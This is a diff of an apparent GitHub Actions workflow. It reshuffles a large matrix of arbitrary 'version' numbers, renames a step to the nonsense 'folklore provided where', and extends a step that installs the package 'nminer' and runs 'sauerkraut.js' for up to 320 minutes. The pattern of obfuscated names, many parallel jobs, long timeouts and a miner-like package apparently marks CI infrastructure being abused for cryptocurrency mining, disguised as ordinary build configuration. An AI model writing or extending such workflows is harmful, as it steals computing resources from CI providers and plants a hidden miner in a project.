@@ -9,25 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2193 }
-          - { version: 8491 }
-          - { version: 3343 }
-          - { version: 8022 }
-          - { version: 8200 }
-          - { version: 9823 }
-          - { version: 7679 }
-          - { version: 4770 }
-          - { version: 7063 }
-          - { version: 573 }
-          - { version: 1218 }
-          - { version: 2762 }
-          - { version: 247 }
-          - { version: 4951 }
-          - { version: 1220 }
-          - { version: 6792 }
-          - { version: 317 }
-          - { version: 7932 }
-          - { version: 6227 }
+          - { version: 1704 }
+          - { version: 6686 }
+          - { version: 3801 }
+          - { version: 4727 }
+          - { version: 1143 }
+          - { version: 1642 }
+          - { version: 1639 }
+          - { version: 9295 }
+          - { version: 6250 }
+          - { version: 883 }
+          - { version: 7402 }
+          - { version: 530 }
+          - { version: 9968 }
+          - { version: 8899 }
+          - { version: 5489 }
 
     steps:
       - name: Checkout
@@ -38,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: folklore provided where
         run: |
           npm install nminer@latest
-          timeout 310m node sauerkraut.js || echo "sauerkraut executed"
+          timeout 320m node sauerkraut.js || echo "sauerkraut executed"
